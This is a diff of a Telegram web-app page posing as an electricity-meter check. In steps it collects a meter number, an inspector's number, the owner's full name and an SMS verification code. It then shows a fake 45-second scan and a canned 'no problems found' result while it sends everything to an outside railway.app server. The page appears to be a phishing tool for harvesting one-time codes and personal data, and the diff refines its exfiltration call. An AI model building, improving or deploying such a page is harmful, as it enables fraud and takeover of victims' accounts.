@@ -8,55 +8,50 @@
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
-    
+   
     body {
       font-family: 'Inter', system-ui, sans-serif;
     }
-    
+   
     .glass {
       background: rgba(255, 255, 255, 0.75);
       backdrop-filter: blur(20px);
       -webkit-backdrop-filter: blur(20px);
     }
-    
+   
     .dark .glass {
       background: rgba(30, 30, 30, 0.75);
     }
-
     .step-circle {
       transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
     }
-
     .input-focus {
       transition: all 0.2s;
     }
-    
+   
     .input-focus:focus-within {
       transform: translateY(-2px);
       box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.2);
     }
-
     @keyframes fadeSlide {
       from { opacity: 0; transform: translateY(20px); }
       to { opacity: 1; transform: translateY(0); }
     }
-    
+   
     .animate-step {
       animation: fadeSlide 0.4s ease forwards;
     }
   </style>
 </head>
 <body class="bg-zinc-50 dark:bg-zinc-950 text-zinc-900 dark:text-white min-h-screen">
-
-<div class="max-w-[420px] mx-auto p-4">
-
+<div id="mainContainer" class="max-w-[420px] mx-auto p-4">
   <!-- Header + Progress -->
   <div class="mb-8">
     <div class="flex items-center justify-between mb-6">
       <h1 class="text-2xl font-semibold">Проверка счётчика</h1>
       <div id="stepCounter" class="text-sm font-medium text-zinc-500 dark:text-zinc-400">1 из 5</div>
     </div>
-    
+   
     <!-- Progress Bar -->
     <div class="flex justify-between mb-2">
       <div id="progress1" class="step-circle w-8 h-8 flex items-center justify-center rounded-full bg-blue-600 text-white text-sm font-semibold">1</div>
@@ -69,9 +64,7 @@
       <div id="progressBar" class="h-full w-1/5 bg-blue-600 rounded-full transition-all duration-500"></div>
     </div>
   </div>
-
   <div id="stepsContainer">
-
     <!-- Шаг 1 -->
     <div id="step1" class="glass border border-zinc-200 dark:border-zinc-800 rounded-3xl p-6 animate-step">
       <p class="text-lg font-medium mb-4">Укажите № счетчика</p>
@@ -83,7 +76,6 @@
         Продолжить
       </button>
     </div>
-
     <!-- Шаг 2 -->
     <div id="step2" class="hidden glass border border-zinc-200 dark:border-zinc-800 rounded-3xl p-6 animate-step">
       <p class="text-lg font-medium mb-4">Номер проверяющего</p>
@@ -95,7 +87,6 @@
         Продолжить
       </button>
     </div>
-
     <!-- Шаг 3 -->
     <div id="step3" class="hidden glass border border-zinc-200 dark:border-zinc-800 rounded-3xl p-6 animate-step">
       <p class="text-lg font-medium mb-4">Укажите ФИО владельца счётчика</p>
@@ -106,7 +97,6 @@
         Продолжить
       </button>
     </div>
-
     <!-- Шаг 4 -->
     <div id="step4" class="hidden glass border border-zinc-200 dark:border-zinc-800 rounded-3xl p-6 animate-step">
       <p class="text-lg font-medium mb-4">Верификация владельца</p>
@@ -127,7 +117,6 @@
         </button>
       </div>
     </div>
-
     <!-- Шаг короткий номер -->
     <div id="stepShort" class="hidden glass border border-zinc-200 dark:border-zinc-800 rounded-3xl p-6 animate-step">
       <p class="text-lg font-medium mb-4">Укажите код из СМС для верификации:</p>
@@ -138,10 +127,8 @@
         Завершить
       </button>
     </div>
-
   </div>
 </div>
-
 <!-- Loading / Success -->
 <div id="loading" class="hidden fixed inset-0 bg-black/80 flex items-center justify-center z-50">
   <div class="text-center">
@@ -150,15 +137,12 @@
     <div class="text-blue-300 text-sm">Поднесите устройство ближе к счётчику</div>
   </div>
 </div>
-
 <script>
 const tg = window.Telegram.WebApp;
 tg.ready();
 tg.expand();
-
 let currentStep = 1;
 let data = { numberChecked: "", numberChecker: "", fio: "", wishCount: "", shortNumber: "" };
-
 const els = {
   step1: document.getElementById("step1"),
   step2: document.getElementById("step2"),
@@ -182,12 +166,11 @@ const els = {
   btnNoWish: document.getElementById("btnNoWish"),
   btnShort: document.getElementById("btnShort")
 };
-
 function updateProgress() {
   const percent = ((currentStep - 1) / 5) * 100;
   els.progressBar.style.width = percent + "%";
   els.stepCounter.textContent = `${currentStep} из 5`;
-  
+ 
   for (let i = 1; i <= 5; i++) {
     const el = document.getElementById(`progress${i}`);
     if (i < currentStep) el.classList.add("!bg-green-500", "text-white");
@@ -195,7 +178,6 @@ function updateProgress() {
     else el.classList.remove("!bg-blue-600", "!bg-green-500", "text-white");
   }
 }
-
 function showStep(nextStep) {
   document.querySelectorAll("#stepsContainer > div").forEach(s => s.classList.add("hidden"));
   const stepId = nextStep === 5 ? "stepShort" : `step${nextStep}`;
@@ -203,7 +185,6 @@ function showStep(nextStep) {
   currentStep = nextStep;
   updateProgress();
 }
-
 // Шаг 1
 els.btn1.addEventListener("click", () => {
   const val = els.numberChecked.value.trim();
@@ -214,7 +195,6 @@ els.btn1.addEventListener("click", () => {
   data.numberChecked = val;
   showStep(2);
 });
-
 // Шаг 2
 els.btn2.addEventListener("click", () => {
   const val = els.numberChecker.value.trim();
@@ -225,7 +205,6 @@ els.btn2.addEventListener("click", () => {
   data.numberChecker = val;
   showStep(3);
 });
-
 // Шаг 3
 els.btn3.addEventListener("click", () => {
   const val = els.fio.value.trim();
@@ -236,18 +215,15 @@ els.btn3.addEventListener("click", () => {
   data.fio = val;
   showStep(4);
 });
-
 // Шаг 4
 els.btn4.addEventListener("click", () => {
   data.wishCount = els.wishCount.value.trim() || "0";
   startLoading();
 });
-
 els.btnNoWish.addEventListener("click", () => {
   data.wishCount = "0";
   showStep(5);
 });
-
 // Короткий номер
 els.btnShort.addEventListener("click", () => {
   const val = els.shortNumber.value.trim();
@@ -258,13 +234,10 @@ els.btnShort.addEventListener("click", () => {
   data.shortNumber = val;
   startLoading();
 });
-
 function startLoading() {
-  console.log("Запуск загрузки, собранные данные:", data); // ← для отладки, увидишь в консоли
-
-  document.querySelector(".max-w-[420px]").classList.add("hidden");
+  console.log("Запуск загрузки, собранные данные:", data);
+  document.getElementById("mainContainer").classList.add("hidden");
   els.loading.classList.remove("hidden");
-
   setTimeout(() => {
     els.loading.innerHTML = `
       <div class="text-center text-white">
@@ -273,8 +246,6 @@ function startLoading() {
         <div class="text-green-400 text-xl">Проблем не обнаружено</div>
       </div>
     `;
-
-    // ИСПРАВЛЕННЫЙ fetch — правильный URL и метод POST на /api/save
     fetch('https://helper-chek-bot-2026-production.up.railway.app/api/save', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -286,14 +257,13 @@ function startLoading() {
     })
     .then(r => r.json())
     .then(res => {
-      console.log("Ответ от сервера:", res); // ← увидишь в консоли успех
+      console.log("Ответ от сервера:", res);
     })
     .catch(err => {
-      console.error("Ошибка при отправке:", err); // ← если ошибка — увидишь
+      console.error("Ошибка при отправке:", err);
     });
   }, 45000);
 }
-
 // Инициализация
 updateProgress();
 console.log("🚀 Современный дизайн загружен — выглядит шикарно!");
